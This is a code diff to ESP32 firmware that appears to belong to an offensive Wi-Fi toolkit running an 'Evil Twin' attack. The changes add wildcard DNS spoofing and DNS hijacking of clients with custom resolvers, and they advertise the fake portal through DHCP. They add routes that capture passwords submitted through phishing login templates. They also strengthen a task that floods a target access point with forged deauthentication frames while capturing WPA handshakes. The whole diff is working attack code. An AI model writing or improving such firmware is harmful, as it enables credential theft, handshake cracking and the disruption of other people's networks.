@@ -1,7 +1,9 @@
+#include "NrDebugLog.h"
 #include "portal.h"
 #include "sniffer.h"
 
 #include <esp_wifi_ap_get_sta_list.h>
+#include <esp_idf_version.h>
 
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
     #include <FFat.h>
@@ -22,6 +24,10 @@
 namespace {
 constexpr const char* PORTAL_HTML_PATH = "/portal/index.html";
 constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;
+// Give the host time to subscribe to the PCAP stream after START_PORTAL
+// returns before the first deauth/reconnect handshake can begin.
+constexpr uint32_t DEAUTH_START_GRACE_MS = 1000;
+constexpr uint32_t STATION_COUNT_POLL_INTERVAL_MS = 1000;
 constexpr uint32_t PORTAL_AP_RESET_SETTLE_MS = 750;
 constexpr uint32_t PORTAL_AP_RETRY_SETTLE_MS = 1000;
 constexpr uint32_t PORTAL_AP_START_SETTLE_MS = 350;
@@ -50,6 +56,9 @@ bool PortalManager::setupDNSSpoof() {
     if (_dnsServer) return true;
     _dnsServer = new DNSServer();
     if (!_dnsServer) return false;
+    // Keep wildcard captive-portal answers positive. The default non-existent
+    // domain code can make clients treat a portal probe as a hard DNS failure.
+    _dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
     const bool started = _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
     if (!started) {
         delete _dnsServer;
@@ -98,12 +107,17 @@ bool PortalManager::restoreIdleAp() {
     idlePass[8] = '\0';
 
     const bool ok = WiFi.softAP(idleSsid, idlePass, 1, 1, 1);
-    Serial.printf("PORTAL: hidden idle AP restore %s\n", ok ? "ok" : "failed");
+    NRSUITE_DEBUG_PRINTF("PORTAL: hidden idle AP restore %s\n", ok ? "ok" : "failed");
     return ok;
 }
 
 void PortalManager::cleanupFailedStart() {
     _running = false;
+    Sniffer::instance()->setDnsHijack(false);
+    if (_snifferStarted) {
+        Sniffer::instance()->stop();
+        _snifferStarted = false;
+    }
     teardownServerAndDns();
     if (_deauthTaskHandle) {
         vTaskDelete(_deauthTaskHandle);
@@ -117,7 +131,7 @@ void PortalManager::cleanupFailedStart() {
     restoreIdleAp();
     if (_htmlFile) _htmlFile.close();
     unmountPortalStorage();
-    Serial.printf("PORTAL: start failure cleanup complete, heap=%lu\n",
+    NRSUITE_DEBUG_PRINTF("PORTAL: start failure cleanup complete, heap=%lu\n",
                   (unsigned long)ESP.getFreeHeap());
 }
 
@@ -263,6 +277,16 @@ void PortalManager::sendPortalContent(AsyncWebServerRequest* request) {
     }
 }
 
+void PortalManager::sendLandingResponse(AsyncWebServerRequest* request) {
+    if (_showNotice) {
+        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
+        addNoCacheHeaders(response);
+        request->send(response);
+    } else {
+        sendPortalContent(request);
+    }
+}
+
 void PortalManager::setupRoutes() {
     _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
         emitClientSeen(request, "GET /");
@@ -274,13 +298,7 @@ void PortalManager::setupRoutes() {
         ev["client_ip"] = request->client()->remoteIP().toString();
         if (_proto) _proto->sendEvent("portal_viewed", ev);
 
-        if (_showNotice) {
-            AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
-            addNoCacheHeaders(response);
-            request->send(response);
-        } else {
-            sendPortalContent(request);
-        }
+        sendLandingResponse(request);
     });
 
     _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
@@ -313,14 +331,42 @@ void PortalManager::setupRoutes() {
         handleCaptiveSubmission(request, "GET /login");
     });
 
+    // A small set of common custom-template form actions. This intentionally
+    // avoids a catch-all POST handler while covering the routes used by most
+    // captive-portal templates.
+    _server->on("/", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /");
+    });
+    _server->on("/submit", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /submit");
+    });
+    _server->on("/connect", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /connect");
+    });
+    _server->on("/signin", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /signin");
+    });
+    _server->on("/auth", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /auth");
+    });
+    _server->on("/authorize", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /authorize");
+    });
+
     _server->onNotFound([this](AsyncWebServerRequest* request) {
-        emitClientSeen(request, "GET other");
-        request->redirect("http://192.168.4.1/");
+        // Existing routes render content directly. Unknown paths enter the
+        // normal portal flow through an HTTP redirect, but arbitrary unknown
+        // POST bodies are not treated as credentials.
+        emitClientSeen(request, "forced route");
+        request->redirect("/");
     });
 }
 
 void PortalManager::deauthTaskFn(void* pv) {
     auto* self = (PortalManager*)pv;
+    // START_PORTAL has already returned to the host by this point. Wait for
+    // the app to attach its PCAP collector before forcing a reconnect.
+    vTaskDelay(pdMS_TO_TICKS(DEAUTH_START_GRACE_MS));
     uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
     memcpy(frame+10, self->_targetBssid, 6);
     memcpy(frame+16, self->_targetBssid, 6);
@@ -340,11 +386,11 @@ void PortalManager::deauthTaskFn(void* pv) {
 
 // portal.cpp
 bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid,
-                          bool showNotice, String* error) {
+                          bool showNotice, String* error, bool dnsHijackEnabled) {
     stop();  // always clean up any previous state, even if a prior start() failed partway
     _showNotice = showNotice;
 
-    Serial.printf(
+    NRSUITE_DEBUG_PRINTF(
         "PORTAL: start ssid='%s' channel=%u notice=%s heap=%lu\n",
         ssid ? ssid : "",
         (unsigned)channel,
@@ -356,11 +402,11 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     // no AP/server can be left half-started.
     if (!mountPortalStorage()) {
         if (error) *error = "portal storage mount failed";
-        Serial.println("PORTAL: storage mount failed before AP start");
+        NRSUITE_DEBUG_PRINTLN("PORTAL: storage mount failed before AP start");
         cleanupFailedStart();
         return false;
     }
-    Serial.println("PORTAL: storage mounted");
+    NRSUITE_DEBUG_PRINTLN("PORTAL: storage mounted");
 
     // Keep the radio in APSTA mode. Do not cycle through STA mode here: on
     // Arduino-ESP32 that can create a visible default open ESP_XXXXXX SoftAP
@@ -373,14 +419,14 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     bool apReady = false;
     esp_err_t err = ESP_OK;
     for (uint8_t attempt = 1; attempt <= PORTAL_AP_START_ATTEMPTS; ++attempt) {
-        Serial.printf("PORTAL: softAP start attempt %u/%u\n",
+        NRSUITE_DEBUG_PRINTF("PORTAL: softAP start attempt %u/%u\n",
                       (unsigned)attempt, (unsigned)PORTAL_AP_START_ATTEMPTS);
         WiFi.softAPdisconnect(true);
         delay(PORTAL_AP_RESET_SETTLE_MS);
 
         const bool apOk = WiFi.softAP(ssid, nullptr, channel);
         if (!apOk) {
-            Serial.println("PORTAL: WiFi.softAP returned false");
+            NRSUITE_DEBUG_PRINTLN("PORTAL: WiFi.softAP returned false");
             if (attempt < PORTAL_AP_START_ATTEMPTS) {
                 delay(PORTAL_AP_RETRY_SETTLE_MS);
                 continue;
@@ -389,13 +435,16 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         }
         _apStarted = true;
 
+        const IPAddress portalIp(192, 168, 4, 1);
         const bool cfgOk = WiFi.softAPConfig(
-            IPAddress(192, 168, 4, 1),
-            IPAddress(192, 168, 4, 1),
-            IPAddress(255, 255, 255, 0)
+            portalIp,
+            portalIp,
+            IPAddress(255, 255, 255, 0),
+            IPAddress(192, 168, 4, 2),
+            portalIp
         );
         if (!cfgOk) {
-            Serial.println("PORTAL: WiFi.softAPConfig failed");
+            NRSUITE_DEBUG_PRINTLN("PORTAL: WiFi.softAPConfig failed");
             _apStarted = false;
             WiFi.softAPdisconnect(true);
             if (attempt < PORTAL_AP_START_ATTEMPTS) {
@@ -404,6 +453,15 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
             }
             break;
         }
+
+        // Advertise the portal as the DHCP captive-portal URI and as the
+        // primary DNS resolver. This covers clients that honour DHCP options;
+        // the promiscuous DNS hook below covers clients with a manual resolver.
+        #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
+        if (!WiFi.AP.enableDhcpCaptivePortal()) {
+            NRSUITE_DEBUG_PRINTLN("PORTAL: DHCP captive-portal URI option failed");
+        }
+        #endif
 
         wifi_config_t cfg{};
         err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
@@ -415,7 +473,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
                 configuredSsidLen <= sizeof(cfg.ap.ssid) &&
                 memcmp(cfg.ap.ssid, ssid, configuredSsidLen) == 0;
             if (!ssidMatches) {
-                Serial.printf(
+                NRSUITE_DEBUG_PRINTF(
                     "PORTAL: softAP reported success but configured SSID length=%u "
                     "does not match requested length=%u\n",
                     (unsigned)configuredSsidLen,
@@ -428,7 +486,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
             }
         }
         if (err != ESP_OK) {
-            Serial.printf("PORTAL: AP channel config failed: %s (%d)\n",
+            NRSUITE_DEBUG_PRINTF("PORTAL: AP channel config failed: %s (%d)\n",
                           esp_err_to_name(err), (int)err);
             _apStarted = false;
             WiFi.softAPdisconnect(true);
@@ -441,7 +499,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
 
         err = esp_wifi_start();
         if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
-            Serial.printf("PORTAL: esp_wifi_start failed: %s (%d)\n",
+            NRSUITE_DEBUG_PRINTF("PORTAL: esp_wifi_start failed: %s (%d)\n",
                           esp_err_to_name(err), (int)err);
             _apStarted = false;
             WiFi.softAPdisconnect(true);
@@ -453,7 +511,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         }
 
         apReady = true;
-        Serial.printf("PORTAL: softAP up, ssid='%s' ip=%s\n",
+        NRSUITE_DEBUG_PRINTF("PORTAL: softAP up, ssid='%s' ip=%s\n",
                       ssid,
                       WiFi.softAPIP().toString().c_str());
         break;
@@ -467,7 +525,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
                 *error += esp_err_to_name(err);
             }
         }
-        Serial.println("PORTAL: softAP could not be brought up cleanly");
+        NRSUITE_DEBUG_PRINTLN("PORTAL: softAP could not be brought up cleanly");
         cleanupFailedStart();
         return false;
     }
@@ -475,7 +533,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
 
     bool runtimeReady = false;
     for (uint8_t attempt = 1; attempt <= PORTAL_RUNTIME_INIT_ATTEMPTS; ++attempt) {
-        Serial.printf("PORTAL: HTTP/DNS init attempt %u/%u\n",
+        NRSUITE_DEBUG_PRINTF("PORTAL: HTTP/DNS init attempt %u/%u\n",
                       (unsigned)attempt, (unsigned)PORTAL_RUNTIME_INIT_ATTEMPTS);
         if (!setupHttpServer(error)) {
             teardownServerAndDns();
@@ -484,13 +542,13 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         }
         if (!setupDNSSpoof()) {
             if (error) *error = "DNS server start failed";
-            Serial.println("PORTAL: DNS server start failed");
+            NRSUITE_DEBUG_PRINTLN("PORTAL: DNS server start failed");
             teardownServerAndDns();
             delay(PORTAL_AP_RESET_SETTLE_MS);
             continue;
         }
         runtimeReady = true;
-        Serial.println("PORTAL: HTTP and DNS servers started");
+        NRSUITE_DEBUG_PRINTLN("PORTAL: HTTP and DNS servers started");
         break;
     }
 
@@ -501,14 +559,40 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     }
 
     _running = true;
+    _lastStationCount = 0;
+    _lastStationCountPollMs = millis();
+    if (dnsHijackEnabled) {
+        Sniffer::instance()->setDnsHijack(true, WiFi.softAPIP());
+    }
+    const bool include5ghz = channel > 14;
     if (targetBssid) {
         memcpy(_targetBssid, targetBssid, 6);
         _hasTarget = true;
         Sniffer::instance()->setEapolFilter(true, targetBssid);
-        Sniffer::instance()->startFixed(channel);
-        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
+        _snifferStarted = Sniffer::instance()->startFixed(channel, include5ghz);
+        if (!_snifferStarted) {
+            if (error) *error = "capture start failed";
+            NRSUITE_DEBUG_PRINTLN("PORTAL: EAPOL capture start failed");
+            cleanupFailedStart();
+            return false;
+        }
+        if (xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle) != pdPASS) {
+            _deauthTaskHandle = nullptr;
+            if (error) *error = "deauth task start failed";
+            NRSUITE_DEBUG_PRINTLN("PORTAL: deauth task start failed");
+            cleanupFailedStart();
+            return false;
+        }
+    } else if (dnsHijackEnabled) {
+        _snifferStarted = Sniffer::instance()->startDnsHijack(channel, include5ghz);
     }
-    Serial.printf("PORTAL: started successfully, heap=%lu\n",
+    if (dnsHijackEnabled && !_snifferStarted) {
+        // lwIP's wildcard DNS server still works for DHCP-configured clients;
+        // custom-resolver interception is best-effort and must not block the AP.
+        Sniffer::instance()->setDnsHijack(false);
+        NRSUITE_DEBUG_PRINTLN("PORTAL: custom-DNS interception unavailable");
+    }
+    NRSUITE_DEBUG_PRINTF("PORTAL: started successfully, heap=%lu\n",
                   (unsigned long)ESP.getFreeHeap());
     return true;
 }
@@ -610,7 +694,24 @@ bool PortalManager::resetHtml(size_t expectedSize) {
 }
 
 void PortalManager::update() {
+    // ESP32's DNSServer is AsyncUDP-backed; processNextRequest() is a
+    // compatibility no-op. Keep it for API compatibility, then report SoftAP
+    // station-count changes so the app can show the real Evil Twin client count.
     if (_running && _dnsServer) _dnsServer->processNextRequest();
+    if (!_running || !_apStarted || !_proto) return;
+
+    const uint32_t now = millis();
+    if (now - _lastStationCountPollMs < STATION_COUNT_POLL_INTERVAL_MS) return;
+    _lastStationCountPollMs = now;
+    const uint8_t count = WiFi.softAPgetStationNum();
+    if (count == _lastStationCount) return;
+    _lastStationCount = count;
+
+    JsonDocument event;
+    event["type"] = "portal_sta_count";
+    event["clients"] = count;
+    event["timestamp"] = now;
+    _proto->sendEvent("portal_sta_count", event);
 }
 
 void PortalManager::stop() {
@@ -620,7 +721,14 @@ void PortalManager::stop() {
     _showNotice = true;
     _loginAttempts = 0;
     _hasTarget = false;
+    _lastStationCount = 0;
+    _lastStationCountPollMs = 0;
     if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
+    Sniffer::instance()->setDnsHijack(false);
+    if (_snifferStarted) {
+        Sniffer::instance()->stop();
+        _snifferStarted = false;
+    }
     teardownServerAndDns();
 
     // Only tear down the AP if this portal owned it. stopAllModules() calls
@@ -639,7 +747,7 @@ void PortalManager::stop() {
     _htmlExpected = 0;
     _htmlComplete = false;
     if (hadRuntime) {
-        Serial.printf("PORTAL: stopped, AP reset/settled, heap=%lu\n",
+        NRSUITE_DEBUG_PRINTF("PORTAL: stopped, AP reset/settled, heap=%lu\n",
                       (unsigned long)ESP.getFreeHeap());
     }
 }
